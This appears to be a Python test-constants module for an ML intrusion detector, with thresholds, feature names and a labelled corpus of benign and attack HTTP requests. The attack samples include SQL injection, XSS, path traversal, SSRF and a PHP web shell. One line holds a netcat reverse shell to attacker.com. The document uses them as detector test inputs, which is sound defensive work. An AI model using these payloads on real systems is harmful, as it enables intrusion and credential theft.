"""
Shared constants for ML security testing.

Holds performance thresholds, ground-truth labels, feature metadata,
and JSON artifact contents so every test module imports from one source of truth.
"""

import json
import os
from pathlib import Path

# ── Paths ──────────────────────────────────────────────────────────────────────
TESTS_DIR   = Path(__file__).parent
EXPORTS_DIR = TESTS_DIR.parent / "exports"
APP_DIR     = TESTS_DIR.parent / "app"


# ── JSON artifacts ───────────────────────────────────────────────────────────
def _load_json(name: str) -> dict | list:
    path = EXPORTS_DIR / name
    with open(path, encoding="utf-8") as f:
        return json.load(f)


EVALUATION_METRICS    = _load_json("evaluation_metrics.json")
CONFUSION_MATRICES    = _load_json("confusion_matrices.json")
EXECUTION_TIMES       = _load_json("execution_times.json")
DNN_EPOCHS_LOSS       = _load_json("dnn_epochs_loss.json")
GRID_SEARCH_RESULTS   = _load_json("grid_search_results.json")

# Feature names in the exact order the model pipeline expects them
MODEL_FEATURE_ORDER = [
    "count_dot_url",
    "count_dir_url",
    "count_embed_domain_url",
    "count-http",
    "count%_url",
    "count?_url",
    "count-_url",
    "count=_url",
    "url_length",
    "hostname_length_url",
    "sus_url",
    "count-digits_url",
    "count-letters_url",
    "number_of_parameters_url",
    "is_encoded_url",
    "special_count_url",
    "unusual_character_ratio_url",
    "Method_enc",
    "count_dot_content",
    "count%_content",
    "count-_content",
    "count=_content",
    "sus_content",
    "count_digits_content",
    "count_letters_content",
    "content_length",
    "is_encoded_content",
    "special_count_content",
]
EXPECTED_FEATURE_COUNT = len(MODEL_FEATURE_ORDER)   # 27

# ── Ground-truth labels for regression test corpus ────────────────────────────
# Format: (url, content, expected_status)
#   "attack"  = should be classified as Anomalous
#   "normal"  = should be classified as Normal
# These are hand-curated based on the model's training distribution and
# suspicious-word scoring logic in feature_extractor.py.

GROUND_TRUTH: list[tuple[str, str | None, str]] = [
    # --- SQL Injection ---
    ("/search?q=' OR 1=1 --",                                           None,         "attack"),
    ("/admin?user=admin'--",                                             None,         "attack"),
    ("/api?id=1 UNION SELECT password FROM users--",                      None,         "attack"),
    ("/login?usr=admin&pw=' OR ''='",                                    None,         "attack"),
    ("/query?q=DROP TABLE users",                                         None,         "attack"),
    ("/search?input=1'; DELETE FROM sessions; --",                       None,         "attack"),
    ("/item?id=1 AND 1=1",                                               None,         "attack"),
    ("/view?id=1 WAITFOR DELAY '00:00:05'--",                             None,         "attack"),

    # --- XSS ---
    ("/comment?text=<script>alert('xss')</script>",                      None,         "attack"),
    ("/post?body=<img src=x onerror=alert(1)>",                          None,         "attack"),
    ("/search?q=<iframe src=javascript:alert(1)>",                       None,         "attack"),
    ("/profile?name=<svg onload=alert('XSS')>",                           None,         "attack"),
    ("/submit?data=<body onload=document.cookie>",                        None,         "attack"),

    # --- Command Injection ---
    ("/ping?host=127.0.0.1; cat /etc/passwd",                            None,         "attack"),
    ("/exec?cmd=ls -la /root",                                            None,         "attack"),
    ("/shell?arg=|nc -e /bin/sh attacker.com 4444",                      None,         "attack"),

    # --- Path Traversal / File Inclusion ---
    ("/download?file=../../etc/passwd",                                   None,         "attack"),
    ("/load?page=../../windows/system32/drivers/etc/hosts",               None,         "attack"),
    ("/fetch?res=....//....//....//etc/passwd",                           None,         "attack"),
    ("/read?path=/etc/shadow",                                             None,         "attack"),

    # --- SSRF ---
    ("/fetch?url=http://169.254.169.254/latest/meta-data/",                None,         "attack"),
    ("/proxy?url=http://internal.corp.local/admin",                        None,         "attack"),

    # --- Open Redirect ---
    ("/redirect?url=https://evil.com/fake-login",                          None,         "attack"),
    ("/goto?dest=//attacker.com",                                         None,         "attack"),

    # --- Malicious Content payloads (content column) ---
    ("/api/data",                                                         "SELECT * FROM passwords",          "attack"),
    ("/submit",                                                           "<script>document.cookie</script>",  "attack"),
    ("/upload",                                                           "<?php system($_GET['cmd']); ?>",   "attack"),
    ("/comment",                                                          "javascript:alert(document.domain)","attack"),
    ("/form",                                                             "OR 1=1 --",                        "attack"),

    # --- Benign / Normal ---
    ("/home",                                                             None,         "normal"),
    ("/products",                                                         None,         "normal"),
    ("/about",                                                            None,         "normal"),
    ("/contact",                                                          None,         "normal"),
    ("/api/users",                                                        None,         "normal"),
    ("/search?q=laptop",                                                  None,         "normal"),
    ("/search?q=shoes",                                                   None,         "normal"),
    ("/category/electronics",                                             None,         "normal"),
    ("/product/12345",                                                    None,         "normal"),
    ("/login?user=john&pass=Secret123",                                  None,         "normal"),
    ("/checkout?cart=abc",                                                None,         "normal"),
    ("/static/js/app.js",                                                 None,         "normal"),
    ("/static/css/style.css",                                             None,         "normal"),
    ("/images/logo.png",                                                  None,         "normal"),
    ("/health",                                                           None,         "normal"),
    ("/api/v2/status",                                                    None,         "normal"),
    ("/user/profile",                                                     None,         "normal"),
    ("/dashboard",                                                        None,         "normal"),
    ("/settings?theme=dark&lang=en",                                      None,         "normal"),
]


# ── Performance thresholds ────────────────────────────────────────────────────
class Thresholds:
    # Latency (ms)
    P95_LATENCY_MS              = 500     # 95th-percentile response time
    P99_LATENCY_MS              = 1000    # 99th-percentile
    MEAN_LATENCY_MS             = 200     # average over test batch

    # Accuracy
    MIN_ACCURACY                = 0.80    # minimum acceptable accuracy per model

    # False Positive Rate  (normal classified as attack)
    MAX_FPR                     = 0.10    # 10 % – hard security requirement
    MAX_FPR_CRITICAL            = 0.05    # 5 %  – for high-stakes deployments

    # False Negative Rate (attack classified as normal) – also critical
    MAX_FNR                     = 0.15    # 15 %

    # Confidence
    MIN_CONFIDENCE              = 0.50    # minimum confidence for a valid prediction

    # Throughput
    MIN_REQUESTS_PER_SECOND     = 50      # minimum sustained throughput

    # Feature drift
    FEATURE_DRIFT_ZSCORE       = 3.0     # flag if any feature mean drifts > 3σ

    # DNN convergence
    DNN_MIN_EPOCHS              = 10
    DNN_VAL_LOSS_GAP_THRESHOLD = 0.05   # train-val loss gap > 5 % flags overfitting

    # Class imbalance tolerance
    MINORITY_CLASS_RATIO        = 0.20    # warn if minority class < 20 % of dataset


# ── Available models ───────────────────────────────────────────────────────────
ALL_MODELS = [
    "random_forest",
    "knn",
    "decision_tree",
    "gradient_boosting",
    "mlp",
    "svc",
    "dnn",
]

# Models that support predict_proba
MODELS_WITH_PROBA = {"random_forest", "knn", "decision_tree", "gradient_boosting", "mlp", "svc"}

# Models that are tree-based (support feature_importances_)
TREE_MODELS = {"random_forest", "decision_tree", "gradient_boosting"}

# Default model
DEFAULT_MODEL = "random_forest"


# ── Adversarial / obfuscated inputs ──────────────────────────────────────────
# These should be classified as "attack" but may evade naive detection.
EVASION_SQL = [
    "/search?q=' OR 1=1 --",
    "/search?q=SeLeCt/**/FROM/**/users",
    "/search?q=' OR 'a'='a",
    "/search?q=admin'--",
    "/api?id=1/**/UNION/**/SELECT/**/password/**/FROM/**/users",
    "/item?id=1 AND 1=1",
    "/query?q=1; DROP TABLE users",
    "/search?q=%27%20OR%201%3D1%20--",         # URL-encoded single quote
    "/search?q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",  # encoded XSS
]

EVASION_XSS = [
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert`1`>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert(1) autofocus>",
]

EVASION_PATH = [
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",      # double URL encode
]

BENIGN_SHOULD_PASS = [
    ("/products?category=electronics",                     None),
    ("/search?q=running+shoes",                           None),
    ("/user/42/profile",                                  None),
    ("/api/v2/users?page=1&limit=20",                     None),
    ("/about",                                            None),
    ("/static/images/banner.png",                         None),
    ("/checkout?item=abc-123&qty=2",                      None),
]
